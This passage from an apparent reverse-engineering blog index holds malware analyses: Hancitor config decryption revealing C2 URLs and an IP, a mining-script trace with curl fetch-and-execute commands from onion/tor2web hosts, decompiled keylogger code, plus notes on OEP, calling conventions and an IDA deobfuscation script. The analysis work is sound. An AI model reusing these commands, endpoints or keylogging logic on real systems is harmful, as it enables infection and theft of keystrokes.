0xAE, 0x99, 0x5D, 0x69, 0x10, 0x03, 0x68, 0x13, 0x62, 0x78, 0x83, 0x84, 0x60, 0xC7, 0x50, 0x11, 0x23, 0xAD, 0x61, 0x37, 0x94, 0x20, 0x14, 0x5E, 0x9B, 0xAD, 0x09, 0xED, 0x87, 0x4E, 0x68, 0xB7, 0x82, 0x4D, 0x20, 0x03, 0x4C, 0xB7, 0x38, 0xEB, 0x63, 0xA7, 0xB0, 0x1A, 0xD8, 0xAB, 0xD2, 0x03, 0x3A, 0xAF, 0xD9, 0x13, 0xB4, 0xA5, 0xDE, 0xAF, 0xAD, 0x1B, 0x3F, 0xB6, 0x07, 0xAE, 0x19, 0x32, 0xE2, 0x3D, 0x8E, 0x0C, 0xD8, 0x73, 0xB8, 0x8B, 0x4D, 0x1F, 0x2C, 0x2D, 0x78, 0xBC, 0xA8, 0x40, 0x0B, 0xB9, 0x0F, 0x34, 0x3C, 0x33, 0x2E, 0xD7, 0x44, 0x29, 0xDC, 0x19, 0xC8, 0x0D, 0xE4, 0xC1, 0x3C, 0x83, 0xF4, 0x8F, 0xA4, 0xA9, 0xFF, 0xB2, 0xD5, 0xF2, 0x3B, 0xD8, 0x9D, 0xCB, 0x9F, 0x07, 0xAC, 0xAE, 0x80, 0x38, 0x4F, 0xF6, 0x2A, 0x4C, 0x12, 0x4A, 0xF5, 0xA7, 0xFD, 0xC2, 0x55, 0xB2, 0xAD, 0x38, 0x66, 0x24, 0x80, 0xCE, 0x66, 0x0B, 0x2A, 0x02, 0x97, 0x90, 0x03, 0x0C, 0xA0, 0xB9]m = hashlib.sha1()m.update(pbdata)rc4_key = m.digest()[:5]rc4 = ARC4.new(rc4_key)config = rc4.decrypt(bytearray(enc))print(config)BUILD ID: b'0109_iqwnm'C2: b'http://asinvotheir.com/8/forum.php'C2: b'http://ditrismale.ru/8/forum.php'C2: b'http://clatrommon.ru/8/forum.php' send在获得了主机配置后，通过post方式发送到远程主机 获得返回值 1YJQBARZAEg4OCkBVVRcbD0kPVAgPVUpISkNUGBMUBwEWQBIODgpAVVUXGw9JD1QID1VKSEpDCVQYExQH 通过exe的解密和校验方式可知忽略前四个字节并和122进行异或。 那么可以明白，我们访问了http://asinvotheir.com/8/forum.php后，但是我们还不知道这个文件的作用。 我们只知道在此之后它访问了http://107.167.2.123/xN1e 我们回到dll文件中分析 在sub_5B2230函数中，发送了get请求获取到了0209.bin文件，绕后通过check_bin函数进行文件的校验。然后利用decrypt_bin函数进行解密 函数流程 decrypt_bin函数 12345678910111213141516171819ULONG __cdecl decrypt_bin(int a1, int a2, ULONG UncompressedBufferSize){ ULONG FinalUncompressedSize; // [esp+0h] [ebp-10h] BYREF NTSTATUS v5; // [esp+4h] [ebp-Ch] PUCHAR UncompressedBuffer; // [esp+8h] [ebp-8h] unsigned int i; // [esp+Ch] [ebp-4h] UncompressedBuffer = sub_5B1390(UncompressedBufferSize); for ( i = 8; i &lt; a2; ++i ) *(i + a1) ^= *(a1 + i % 8); v5 = RtlDecompressBuffer(2u, UncompressedBuffer, UncompressedBufferSize, (a1 + 8), a2 - 8, &amp;FinalUncompressedSize); if ( !v5 ) sub_5B1450(a1, UncompressedBuffer, FinalUncompressedSize); sub_5B13D0(UncompressedBuffer); if ( v5 ) return 0; else return FinalUncompressedSize;} 解密函数 1234567891011import lznt1data = bytearray(open('0209.bin','rb').read())for i in range(8,len(data)): data[i] ^= data[i%8]outs = lznt1.decompress(data[8:])outfile = open('out.bin','wb')outfile.write(outs)outfile.close() 得到了ua头和1个ip地址，但是可疑的是我们的MZ头并没有出现，但是ip和ua头已经正常了，这里先放一下。 那么很明显这部分shellcode的作用就是访问了http://107.167.2.123/xN1e 流量部分一开始访问了feedproxy.google.com/~r/ndfbytcix/~3/FsOlK8-2g6M/arrest.php 由于中间有非常多的加密流，我们这里先过滤出url 1http or tls.handshake.type ==1 apiipify.org查询自身ip，找到公网ip便于后续连接 感染流量 远控主机ip地址为107.167.2.123 参考链接Hancitor Continues to Push Cobalt Strike (thedfirreport.com)","link":"/2022/03/23/2021-09-02%20(THURSDAY)%20-%20HANCITOR%20(CHANITORMAN1MOSKALVZAPOETA511)%20WITH%20COBALT%20STRIKE%20(BEACON)/"},{"title":"ror-hash","text":"ror-hash一个常用于加密导入函数的简单算法 123456789&gt;&gt;&gt; a = 'virtualallocexnuma'.upper() &gt;&gt;&gt; a 'VIRTUALALLOCEXNUMA' &gt;&gt;&gt; h = 0 &gt;&gt;&gt; for c in a: ... h = ror(h, 13) ... h += ord(c) ...&gt;&gt;&gt; h 383669855 如下图就是一个ror-13 hash算法得到的，因此恶意代码分析者无法轻易得知这是加载了哪一个函数。","link":"/2022/03/23/ror-hash/"},{"title":"mining-sh-analysis","text":"mining Virus Analysismd5: eeb8f9ae60c73f84ff85bbeab9c0b6ee filename: .systemd-private-nU9WagjQ8BenWPXt0ovE12uD8jBItv6 Analysisstep1sh文件，简单易懂的base64混淆 解密后得到脚本step-2 step2 exec &amp;&gt;/dev/null不允许输出 export PATH=$PATH:$HOME:/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin设置环境变量 ```┌──(kali㉿kali)-[~]└─$ grep x:$(id -u): /etc/passwd|cut -d: -f6/home/kali 1234567891011121314151617181920214. curl参数设置，这边curl携带的参数为`curl -4fsSLkA- -m200` `-4`(`--ipv4` Resolve names to IPv4 addresses) `--fail`,`--silent`,`--show-error`(Show error even when -s is used), `-L`(`--location` follow the direction) `-k`(`--insecure` Allow insecure server connections), `-A`(`--user-agent &lt;name&gt;`Send User-Agent &lt;name&gt; to server) `-m`(`--max-time` &lt;fractional seconds&gt; Maximum time allowed for transfer)5. 设置了三个函数`u`,`sockz`,`fexe`，太多了，不想看了。暴力解决sh，我们得到如下执行顺序 export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/games:/usr/games:/home/kali:/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/games:/usr/games:/home/kali:/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin ++ cut -d: -f6+++ id -u++ grep x:1000: /etc/passwd d=/home/kali ++ echo ‘curl -4fsSLkA- -m200’ c=’curl -4fsSLkA- -m200’ ++ echo 5ixhieezozxwnvisopgxoba6ssbsrvdpxeduxb4jc6zx7s56rufrjzad t=5ixhieezozxwnvisopgxoba6ssbsrvdpxeduxb4jc6zx7s56rufrjzad for h in tor2web.in tor2web.it ++ head -n 1 /tmp/.X11-unix/01head: cannot open ‘/tmp/.X11-unix/01’ for reading: No such file or directory ls /proc//statusls: cannot access ‘/proc//status’: No such file or directory fexe for i in . $HOME /usr/bin $d /var/tmp echo exit chmod +x ./i cd . ./i break u 5ixhieezozxwnvisopgxoba6ssbsrvdpxeduxb4jc6zx7s56rufrjzad.tor2web.in sockz n=(doh.this.web.id doh.post-factum.tk dns.hostux.net uncensored.lux1.dns.nixnet.xyz dns.rubyfish.cn dns.twnic.tw doh-fi.blahdns.com fi.doh.dns.snopyta.org resolver-eu.lelux.fi doh.li dns.digitale-gesellschaft.ch) ++ echo ‘dns-query?name=relay.tor2socks.in’ p=’dns-query?name=relay.tor2socks.in’ ++ grep -oE ‘\\b([0-9]{1,3}.){3}[0-9]{1,3}\\b’++ curl -4fsSLkA- -m200 ‘https://doh.li/dns-query?name=relay.tor2socks.in'++ grep -Ev ‘[.]0’++ tr ‘ ‘ ‘\\n’++ sort -uR++ head -n 1curl: (35) OpenSSL SSL_connect: Connection reset by peer in connection to doh.li:443 s= ++ uname -m f=/int.x86_64 ++ date++ md5sum++ cut -f1 -d- x=’./90aab6fe6a62477d35a888699d973c67 ‘ ++ curl -4fsSLk checkip.amazonaws.com++ whoami++ uname -m++ uname -n++ ip a++ grep ‘inet ‘++ awk ‘{print $2}’++ awk ‘{print $1}’++ md5sum++ base64 -w0++ crontab -lno crontab for kali r=xx.xx.xxx.xxx_kali_x86_64_kali_3f6b5f40be5a51750b281e352ee16e98_ curl -4fsSLkA- -m200 -x socks5h://:9050 5ixhieezozxwnvisopgxoba6ssbsrvdpxeduxb4jc6zx7s56rufrjzad.onion/int.x86_64 -o./90aab6fe6a62477d35a888699d973c67 -exx.xx.xxx.xxx_kali_x86_64_kali_3f6b5f40be5a51750b281e352ee16e98_curl: (5) Unsupported proxy syntax in ‘socks5h://:9050’ curl -4fsSLkA- -m200 5ixhieezozxwnvisopgxoba6ssbsrvdpxeduxb4jc6zx7s56rufrjzad.tor2web.in/int.x86_64 -o./90aab6fe6a62477d35a888699d973c67 -exx.xx.xxx.xxx_kali_x86_64_kali_3f6b5f40be5a51750b281e352ee16e98_ echo .socks5h://:9050 5ixhieezozxwnvisopgxoba6ssbsrvdpxeduxb4jc6zx7s56rufrjzad.onion/int.x86_64 -o./90aab6fe6a62477d35a888699d973c67 -exx.xx.xxx.xxx_kali_x86_64_kali_3f6b5f40be5a51750b281e352ee16e98_.socks5h://:9050 5ixhieezozxwnvisopgxoba6ssbsrvdpxeduxb4jc6zx7s56rufrjzad.onion/int.x86_64 -o./90aab6fe6a62477d35a888699d973c67 -exx.xx.xxx.xxx_kali_x86_64_kali_3f6b5f40be5a51750b281e352ee16e98_ chmod +x ./90aab6fe6a62477d35a888699d973c67 ./90aab6fe6a62477d35a888699d973c67 ++ head -n 1 /tmp/.X11-unix/01 ls /proc/266947/status/proc/266947/status ++ head -n 1 /tmp/.X11-unix/01 ls /proc/266947/status/proc/266947/status for h in tor2web.in tor2web.it ++ head -n 1 /tmp/.X11-unix/01 ls /proc/266947/status/proc/266947/status break``` 部分命令需要提权，linux病毒分析这块没学过，后面肯定不跟下去了。以后有机会再分析。","link":"/2022/03/29/mining-sh-analysis/"},{"title":"","text":"mining Virus Analysismd5: eeb8f9ae60c73f84ff85bbeab9c0b6ee filename: .systemd-private-nU9WagjQ8BenWPXt0ovE12uD8jBItv6 Analysisstep1sh文件，简单易懂的base64混淆 解密后得到脚本step-2 step2 exec &amp;&gt;/dev/null不允许输出 export PATH=$PATH:$HOME:/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin设置环境变量 ```┌──(kali㉿kali)-[~]└─$ grep x:$(id -u): /etc/passwd|cut -d: -f6/home/kali 1234567891011121314151617181920214. curl参数设置，这边curl携带的参数为`curl -4fsSLkA- -m200` `-4`(`--ipv4` Resolve names to IPv4 addresses) `--fail`,`--silent`,`--show-error`(Show error even when -s is used), `-L`(`--location` follow the direction) `-k`(`--insecure` Allow insecure server connections), `-A`(`--user-agent &lt;name&gt;`Send User-Agent &lt;name&gt; to server) `-m`(`--max-time` &lt;fractional seconds&gt; Maximum time allowed for transfer)5. 设置了三个函数`u`,`sockz`,`fexe`，太多了，不想看了。暴力解决sh，我们得到如下执行顺序 export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/games:/usr/games:/home/kali:/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/games:/usr/games:/home/kali:/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin ++ cut -d: -f6+++ id -u++ grep x:1000: /etc/passwd d=/home/kali ++ echo ‘curl -4fsSLkA- -m200’ c=’curl -4fsSLkA- -m200’ ++ echo 5ixhieezozxwnvisopgxoba6ssbsrvdpxeduxb4jc6zx7s56rufrjzad t=5ixhieezozxwnvisopgxoba6ssbsrvdpxeduxb4jc6zx7s56rufrjzad for h in tor2web.in tor2web.it ++ head -n 1 /tmp/.X11-unix/01head: cannot open ‘/tmp/.X11-unix/01’ for reading: No such file or directory ls /proc//statusls: cannot access ‘/proc//status’: No such file or directory fexe for i in . $HOME /usr/bin $d /var/tmp echo exit chmod +x ./i cd . ./i break u 5ixhieezozxwnvisopgxoba6ssbsrvdpxeduxb4jc6zx7s56rufrjzad.tor2web.in sockz n=(doh.this.web.id doh.post-factum.tk dns.hostux.net uncensored.lux1.dns.nixnet.xyz dns.rubyfish.cn dns.twnic.tw doh-fi.blahdns.com fi.doh.dns.snopyta.org resolver-eu.lelux.fi doh.li dns.digitale-gesellschaft.ch) ++ echo ‘dns-query?name=relay.tor2socks.in’ p=’dns-query?name=relay.tor2socks.in’ ++ grep -oE ‘\\b([0-9]{1,3}.){3}[0-9]{1,3}\\b’++ curl -4fsSLkA- -m200 ‘https://doh.li/dns-query?name=relay.tor2socks.in'++ grep -Ev ‘[.]0’++ tr ‘ ‘ ‘\\n’++ sort -uR++ head -n 1curl: (35) OpenSSL SSL_connect: Connection reset by peer in connection to doh.li:443 s= ++ uname -m f=/int.x86_64 ++ date++ md5sum++ cut -f1 -d- x=’./90aab6fe6a62477d35a888699d973c67 ‘ ++ curl -4fsSLk checkip.amazonaws.com++ whoami++ uname -m++ uname -n++ ip a++ grep ‘inet ‘++ awk ‘{print $2}’++ awk ‘{print $1}’++ md5sum++ base64 -w0++ crontab -lno crontab for kali r=xx.xx.xxx.xxx_kali_x86_64_kali_3f6b5f40be5a51750b281e352ee16e98_ curl -4fsSLkA- -m200 -x socks5h://:9050 5ixhieezozxwnvisopgxoba6ssbsrvdpxeduxb4jc6zx7s56rufrjzad.onion/int.x86_64 -o./90aab6fe6a62477d35a888699d973c67 -exx.xx.xxx.xxx_kali_x86_64_kali_3f6b5f40be5a51750b281e352ee16e98_curl: (5) Unsupported proxy syntax in ‘socks5h://:9050’ curl -4fsSLkA- -m200 5ixhieezozxwnvisopgxoba6ssbsrvdpxeduxb4jc6zx7s56rufrjzad.tor2web.in/int.x86_64 -o./90aab6fe6a62477d35a888699d973c67 -exx.xx.xxx.xxx_kali_x86_64_kali_3f6b5f40be5a51750b281e352ee16e98_ echo .socks5h://:9050 5ixhieezozxwnvisopgxoba6ssbsrvdpxeduxb4jc6zx7s56rufrjzad.onion/int.x86_64 -o./90aab6fe6a62477d35a888699d973c67 -exx.xx.xxx.xxx_kali_x86_64_kali_3f6b5f40be5a51750b281e352ee16e98_.socks5h://:9050 5ixhieezozxwnvisopgxoba6ssbsrvdpxeduxb4jc6zx7s56rufrjzad.onion/int.x86_64 -o./90aab6fe6a62477d35a888699d973c67 -exx.xx.xxx.xxx_kali_x86_64_kali_3f6b5f40be5a51750b281e352ee16e98_ chmod +x ./90aab6fe6a62477d35a888699d973c67 ./90aab6fe6a62477d35a888699d973c67 ++ head -n 1 /tmp/.X11-unix/01 ls /proc/266947/status/proc/266947/status ++ head -n 1 /tmp/.X11-unix/01 ls /proc/266947/status/proc/266947/status for h in tor2web.in tor2web.it ++ head -n 1 /tmp/.X11-unix/01 ls /proc/266947/status/proc/266947/status break``` 部分命令需要提权，linux病毒分析这块没学过，后面肯定不跟下去了。以后有机会再分析。","link":"/2022/03/29/malware/"},{"title":"keylog","text":"样本来源：lab03-03 md5: e2bf42217a67e46433da8b6f4507219e 动态解密资源里的PE后得到了keylog的代码部分。这里不写。 keylog Analysis通过伪代码我可以很清楚得看到keylog的几步 FindWindowA ShowWindow GetModuleHandleA SetWindowHookExA unhookWindowsHookEx 而其中最重要的就是SetWindowHookExA和UnhookWindowsHookEx两个函数了 这里需要注意，如果要下dll断点时，我们的断点应该打在user32.dll. SetWindowsHookExA123456HHOOK SetWindowsHookExA( [in] int idHook, [in] HOOKPROC lpfn, [in] HINSTANCE hmod, [in] DWORD dwThreadId); idhook1[in] idHook Type: int The type of hook procedure to be installed. This parameter can be one of the following values. Value Meaning WH_CALLWNDPROC 4 Installs a hook procedure that monitors messages before the system sends them to the destination window procedure. For more information, see the CallWndProc hook procedure. WH_CALLWNDPROCRET 12 Installs a hook procedure that monitors messages after they have been processed by the destination window procedure. For more information, see the CallWndRetProc hook procedure. WH_CBT 5 Installs a hook procedure that receives notifications useful to a CBT application. For more information, see the CBTProc hook procedure. WH_DEBUG 9 Installs a hook procedure useful for debugging other hook procedures. For more information, see the DebugProc hook procedure. WH_FOREGROUNDIDLE 11 Installs a hook procedure that will be called when the application’s foreground thread is about to become idle. This hook is useful for performing low priority tasks during idle time. For more information, see the ForegroundIdleProc hook procedure. WH_GETMESSAGE 3 Installs a hook procedure that monitors messages posted to a message queue. For more information, see the GetMsgProc hook procedure. WH_JOURNALPLAYBACK 1 Installs a hook procedure that posts messages previously recorded by a WH_JOURNALRECORD hook procedure. For more information, see the JournalPlaybackProc hook procedure. WH_JOURNALRECORD 0 Installs a hook procedure that records input messages posted to the system message queue. This hook is useful for recording macros. For more information, see the JournalRecordProc hook procedure. WH_KEYBOARD 2 Installs a hook procedure that monitors keystroke messages. For more information, see the KeyboardProc hook procedure. WH_KEYBOARD_LL 13 Installs a hook procedure that monitors low-level keyboard input events. For more information, see the LowLevelKeyboardProc hook procedure. WH_MOUSE 7 Installs a hook procedure that monitors mouse messages. For more information, see the MouseProc hook procedure. WH_MOUSE_LL 14 Installs a hook procedure that monitors low-level mouse input events. For more information, see the LowLevelMouseProc hook procedure. WH_MSGFILTER -1 Installs a hook procedure that monitors messages generated as a result of an input event in a dialog box, message box, menu, or scroll bar. For more information, see the MessageProc hook procedure. WH_SHELL 10 Installs a hook procedure that receives notifications useful to shell applications. For more information, see the ShellProc hook procedure. WH_SYSMSGFILTER 6 Installs a hook procedure that monitors messages generated as a result of an input event in a dialog box, message box, menu, or scroll bar. The hook procedure monitors these messages for all applications in the same desktop as the calling thread. For more information, see the SysMsgProc hook procedure. 这里是WH_KEYBOARD_LL 13，也就是Installs a hook procedure that monitors low-level keyboard input events. For more information, see the [LowLevelKeyboardProc](https://docs.microsoft.com/en-us/previous-versions/windows/desktop/legacy/ms644985(v=vs.85)) hook procedure. lpfn A pointer to the hook procedure. If the dwThreadId parameter is zero or specifies the identifier of a thread created by a different process, the lpfn parameter must point to a hook procedure in a DLL. Otherwise, lpfn can point to a hook procedure in the code associated with the current process. lpfn传的是hook的函数 它对回调函数LowLevelKeyboardProc进行了hook sub_4010C7函数存的是对键盘码的处理,这里是写入到了practicalmalwareanalysis.log文件中 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990if ( result != -1 ) { SetFilePointer(result, 0, 0, 2u); ForegroundWindow = GetForegroundWindow(); GetWindowTextA(ForegroundWindow, Str2, 1024); if ( strcmp(Str1, Str2) ) { WriteFile(hFile, aWindow, 0xCu, &amp;NumberOfBytesWritten, 0); v3 = strlen(Str2); WriteFile(hFile, Str2, v3, &amp;NumberOfBytesWritten, 0); WriteFile(hFile, asc_40503C, 4u, &amp;NumberOfBytesWritten, 0); strncpy(Str1, Str2, 0x3FFu); byte_40574F = 0; } if ( Buffer &lt; 39 || Buffer &gt; 64 ) { if ( Buffer &lt;= 64 || Buffer &gt;= 91 ) { switch ( Buffer ) { case 8u: v4 = strlen(aBackspace); WriteFile(hFile, aBackspace_0, v4, &amp;NumberOfBytesWritten, 0); break; case 9u: WriteFile(hFile, aTab, 5u, &amp;NumberOfBytesWritten, 0); break; case 0xDu: WriteFile(hFile, aEnter, 8u, &amp;NumberOfBytesWritten, 0); break; case 0x10u: WriteFile(hFile, aShift, 7u, &amp;NumberOfBytesWritten, 0); break; case 0x11u: WriteFile(hFile, aCtrl, 6u, &amp;NumberOfBytesWritten, 0); break; case 0x14u: v5 = strlen(aCapsLock); WriteFile(hFile, aCapsLock_0, v5, &amp;NumberOfBytesWritten, 0); break; case 0x20u: WriteFile(hFile, asc_405074, 1u, &amp;NumberOfBytesWritten, 0); break; case 0x2Eu: WriteFile(hFile, aDel, 5u, &amp;NumberOfBytesWritten, 0); break; case 0x60u: WriteFile(hFile, a0, 1u, &amp;NumberOfBytesWritten, 0); break; case 0x61u: WriteFile(hFile, a1, 1u, &amp;NumberOfBytesWritten, 0); break; case 0x62u: WriteFile(hFile, a2, 1u, &amp;NumberOfBytesWritten, 0); break; case 0x63u: WriteFile(hFile, a3, 1u, &amp;NumberOfBytesWritten, 0); break; case 0x64u: WriteFile(hFile, a4, 1u, &amp;NumberOfBytesWritten, 0); break; case 0x65u: WriteFile(hFile, a5, 1u, &amp;NumberOfBytesWritten, 0); break; case 0x66u: WriteFile(hFile, a6, 1u, &amp;NumberOfBytesWritten, 0); break; case 0x67u: WriteFile(hFile, a7, 1u, &amp;NumberOfBytesWritten, 0); break; case 0x68u: WriteFile(hFile, a8, 1u, &amp;NumberOfBytesWritten, 0); break; case 0x69u: WriteFile(hFile, a9, 1u, &amp;NumberOfBytesWritten, 0); break; default: return CloseHandle(hFile); } } else { Buffer += 32; WriteFile(hFile, &amp;Buffer, 1u, &amp;NumberOfBytesWritten, 0); } } else { WriteFile(hFile, &amp;Buffer, 1u, &amp;NumberOfBytesWritten, 0); }","link":"/2022/04/01/keylog/"},{"title":"oep_tricks","text":"OEP tricksintroWhy is the PE Entry Point Not the same as Main Understanding __security__init__cookieandscrt_common_main_seh 在第一次学习如何对 Windows 二进制文件进行逆向工程时，尤其是在使用调试器时，这是一个需要理解的重要概念。 当调试器在 PE 入口点上中断时，通常会让人感到困惑，只是为了找到一些与二进制文件的主要功能无关的代码。 此代码通常称为boilerplate代码，由 MSVC 编译器自动插入。 这对我们识别代码和方向有很大帮助。 MSVC console Application Entry pointThe Entry Point on an MSVC console application servers two purples . calls the __security__init_cookie function jumps to the __scrt_common_main_sehthunk The __scrt_common_main_seh thunk then performs some setup for the binary including some structured exception handler (SEH) setup and then calls main. __security_init_cookie The purpose of this cookie is best described by MSDN 全局安全 cookie 用于在使用 /GS（缓冲区安全检查）编译的代码和使用异常处理的代码中进行缓冲区溢出保护。 在进入受溢出保护的函数时，cookie 被放入堆栈，而在退出时，堆栈上的值与全局 cookie 进行比较。 它们之间的任何差异都表明发生了缓冲区溢出并导致程序立即终止。 Normally, __security_init_cookie is called by the CRT when it’s initialized. If you bypass CRT initialization—for example, if you use /ENTRY to specify an entry-point—then you must call __security_init_cookie yourself. If __security_init_cookie isn’t called, the global security cookie is set to a default value and buffer overrun protection is compromised. Because an attacker can exploit this default cookie value to defeat the buffer overrun checks, we recommend that you always call __security_init_cookie when you define your own entry point. we can use the opcode 48 89 5C 24 20 55 48 8B EC 48 83 EC 20 to find the __security_init_cookie The call to __security_init_cookie must be made before any overrun-protected function is entered; otherwise a spurious buffer overrun will be detected. For more information, see C Runtime Error R6035. __scrt_common_main_sehLooking at this code without labels (for example in x64dbg) it can be confusing to identify where main is. Luckily MSVC console applications all have the same main function prototype. *main(int argc, const char **argv, const char *envp) This function prototype can be used to identify the call to main in __scrt_common_main_seh, simply by looking for the three arguments that are passed to main: argc, argv, envp. In 64-bit binaries these arguments are compiled into a series of three mov instructions moving the arguments into the registers RCX, RDX, R8 1234C 8B C7 mov r8, rdi ; envp48 8B D3 mov rdx, rbx ; argv8B 08 mov ecx, [rax] ; argc In 32-bit binaries these arguments are compiled into a series of three push instructions pushing the arguments onto the stack. ！！！！！！These patterns can be relied on to identify main. ！！！！！！！","link":"/2022/04/04/oep-tricks/"},{"title":"calling-convention","text":"Calling ConventionsThere are different calling conventions for different operating systems or different bits of systemor you compile with the vs (or others) Different conventions based on processor,OS,and Language Describe how are passed to functions Describe how are returned from functions Describe if the caller or callee clean the stack Resonsible for function andprologueandepilogue Windows x86 Calling Convention Keyword Stack cleanup Parameter passing __cdecl Caller Pushes parameters on the stack, in reverse order (right to left) __clrcall n/a Load parameters onto CLR expression stack in order (left to right). __stdcall Callee Pushes parameters on the stack, in reverse order (right to left) __fastcall Callee Stored in registers, then pushed on stack __thiscall Callee Pushed on stack; this pointer stored in ECX __vectorcall Callee Stored in registers, then pushed on stack in reverse order (right to left) All arguments are widened to 32 bits(DWORD) Return value is widened to 32 bits(DWORD) Return values up to 32 bits are returned to eax register Return values of 64 bit size(QWORD) are returned in EDX:EAX(The main value is in the EDX Register) Return Structures are returned by reference with a pointer in EAX Registers ESI,EDI,EBX,and EBP are restored(non-volatile) MSDN is your friend __cdecl Default calling convention for c and c++ Arguments are passed on the stack(pushed right-to-left) Called is responsible for stack cleanup will (cdecl will clean the stack ) this is important when there are variadic functions,so function doesn’t worry about stack cleaning. Supports varag(variadic)functions Example code below: then we can get follow code with ida sub_401090 is the hello1 function sub_401000 is the addingNumberVariadic function which is variadic notice that caller clean the stack when the function return __stdcallThe __stdcall calling convention is used to call Win32 API functions. The callee cleans the stack, so the compiler makes vararg functions __cdecl. Functions that use this calling convention require a function prototype. The __stdcall modifier is Microsoft-specific. Element Implementation Argument-passing order Right to left. Argument-passing convention By value, unless a pointer or reference type is passed. Stack-maintenance responsibility Called function pops its own arguments from the stack. Name-decoration convention An underscore (_) is prefixed to the name. The name is followed by the at sign (@) followed by the number of bytes (in decimal) in the argument list. Therefore, the function declared as int func( int a, double b ) is decorated as follows: _func@12 __fastcallThe __fastcall calling convention specifies that arguments to functions are to be passed in registers, when possible. This calling convention only applies to the x86 architecture. The following list shows the implementation of this calling convention. Element Implementation Argument-passing order The first two DWORD or smaller arguments that are found in the argument list from left to right are passed in ECX and EDX registers; all other arguments are passed on the stack from right to left. Stack-maintenance responsibility Called function pops the arguments from the stack. Name-decoration convention At sign (@) is prefixed to names; an at sign followed by the number of bytes (in decimal) in the parameter list is suffixed to names. Case-translation convention No case translation performed. __thiscallThe Microsoft-specific __thiscall calling convention is used on C++ class member functions on the x86 architecture. It’s the default calling convention used by member functions that don’t use variable arguments (vararg functions). Under __thiscall, the callee cleans the stack, which is impossible for vararg functions. Arguments are pushed on the stack from right to left. The this pointer is passed via register ECX, and not on the stack. vararg member functions use the __cdecl calling convention. All function arguments are pushed on the stack, with the this pointer placed on the stack last. Because this calling convention applies only to C++, it doesn’t have a C name decoration scheme. When you define a non-static class member function out-of-line, specify the calling convention modifier only in the declaration. You don’t have to specify it again on the out-of-line definition. The compiler uses the calling convention specified during declaration at the point of definition. __vectorcallThe __vectorcall calling convention specifies that arguments to functions are to be passed in registers. __vectorcall uses more registers for arguments than __fastcall or the default x64 calling convention(rcx rdx r7 r8 [rsp+[size of arg]) use. The __vectorcall calling convention is only supported in native code on x86 and x64 processors that include Streaming SIMD Extensions 2 (SSE2) and above. Use __vectorcall to speed functions that pass several floating-point or SIMD vector arguments and perform operations that take advantage of the arguments loaded in registers. The following list shows the features that are common to the x86 and x64 implementations of __vectorcall. The differences are explained later in this article. to be continue one day Reference: https://docs.microsoft.com/en-us/cpp/cpp/argument-passing-and-naming-conventions?view=msvc-170","link":"/2022/04/07/calling-convention/"},{"title":"Pandora-Ransomeware-fla-unpack","text":"Pandora Ransomware[TOC] overviewFirst of all, I love oalabs. Below of code is copied from his research, and I get a lot from just repeat it. And maybe there are also bogus-control-flow in this sample however. Sample: 5b56c5d86347e164c6e571c86dbf5b1535eae6b979fede6ed66b01e79ea33b7b Unpacked sample: 2619862c382d3e375f13f3859c6ab44db1a4bce905b4a617df2390fbf36902e7 on the malshare(by the oalabs) References Control Flow Flattening Deobfuscation - Recovering an ollvm dumpulator Control Flow Unflattening malshare oalabs Dumpulator according to the jmp [register] Our approach is to seperate the dispatcher bb from the payload bb. For each dispatcher bb the code is emulated with all conditions to generate the conditional jump addresses. The bb is then replaced with a simple compare and conditional jmp. Emulation is done with Dumpulator. Once the dispatcher has been deobfuscated we should be able to see the control flow for the payload bb, and futher simplify the dispatcher using more traditional tools, possibly removing it completely. if the jump is relative it’s for a code bb if the jump is register then it’s a cf bb if there is a ret this is the end build a table of bb the start is next head after jmp, end is jmp emulate patch the jmp for each table entry IDA Produce Basic Block TableThere are two dispatcher bb formats, one that uses cmovl, cmovz, and one that uses setl and setz. We need to match both patterns and determine the type of condition for our jmp statement, and the eax cmp value. For each bb record the following information so it can be used in our emulator. bb start bb end add cmov instruction type of cmov instruction (l,z) eax cmp value jmp register Results: (bb_start, bb_end, eax_value, jmp_condition,jmp_condition_address, jmp_register) 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105# Basic blocks for dispatcherbb_table = []# List of addresses of original code basic blocksbb_orig_table = []ptr = 0x00007FF6654A67F0end = 0x00007FF6654A70D0bb_start = ptrwhile ptr &lt;= end: if print_insn_mnem(ptr) == 'jmp': op_type = idc.get_operand_type(ptr, 0) if op_type == o_reg: # This is a cf bb save it reg_name = print_operand(ptr, 0) # Get eax value first_instruction = print_insn_mnem(bb_start) if first_instruction == 'cmp': eax_cmp_value = get_operand_value(bb_start,1) # Find cmov instruction bb_ptr = bb_start jmp_condition = None jmp_condition_address = None while bb_ptr &lt; ptr: if 'cmovl' == print_insn_mnem(bb_ptr): jmp_condition = 'cmovl' break elif 'cmovz' == print_insn_mnem(bb_ptr): jmp_condition = 'cmovz' break bb_ptr = next_head(bb_ptr) jmp_condition_address = bb_ptr # Check results of cmov find if jmp_condition is None: # This bb doesn't match our pattern skip it print(f&quot;BB at {hex(bb_start)} doesn't contain cmovl or cmovz, skip it&quot;) ptr = next_head(ptr) while not is_code(ida_bytes.get_full_flags(ptr)): ptr = next_head(ptr) bb_start = ptr continue elif first_instruction == 'xor': # assume next instruction is the cmp, we should check ptr_cmp = next_head(bb_start) if &quot;cmp&quot; != print_insn_mnem(ptr_cmp): # This bb doesn't match our pattern skip it print(f&quot;BB at {hex(bb_start)} doesn't contain have cmp after xor, skip it&quot;) ptr = next_head(ptr) while not is_code(ida_bytes.get_full_flags(ptr)): ptr = next_head(ptr) bb_start = ptr continue eax_cmp_value = get_operand_value(ptr_cmp,1) # Find cmov instruction bb_ptr = bb_start jmp_condition = None jmp_condition_address = None while 